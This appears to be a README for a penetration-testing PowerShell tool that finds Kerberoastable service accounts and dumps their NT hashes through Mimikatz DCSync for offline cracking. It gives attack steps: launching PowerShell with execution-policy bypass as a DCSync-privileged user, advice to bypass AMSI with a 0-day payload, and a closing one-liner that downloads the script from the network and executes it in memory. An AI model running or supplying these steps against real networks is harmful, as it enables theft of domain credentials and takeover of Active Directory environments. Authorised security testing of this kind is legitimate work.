# Invoke-SPNDCSync

PowerShell script to enumerate Kerberoastable SPN user account and retrieve their NT-Hash via Mimikatz for password cracking.

This is an alternative to cracking Kerberos-Hashes, since NT-Hashes can be cracked 135 times faster.

## General Preparation

1. Connect to the internal AD network via VPN or directly, if on-site.
2. Configure your operating system's proxy to use the client's proxy. Internet is required to download Invoke-Mimikatz and Invoke-DCSync PS scripts. Alternatively, configure a known proxy via PS:

````
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "127.0.0.1:8080"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1
````
3. Open a new PowerShell terminal as another user; use a privileged domain user account with DCSync rights

````
runas.exe /netonly /noprofile /user:mydomain.prod.dom\dcsyncUser "powershell.exe -ep bypass"
````

4. Verify authenticated AD access within your PowerShell terminal window

## SPN DCSync Preparation

It is recommended to bypass AMSI for the current PowerShell session. Use a 0-Day payload!

# SPN DCSync Execution

Download ``Invoke-SPNDCSync.ps1`` into memory, which executes the DCSync process.

As a result, we will obtain our files located under C:\temp\SPN-DCSYNC\ directory:

````
iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/Invoke-SPNDCSync/main/Invoke-SPNDCSync.ps1')
````
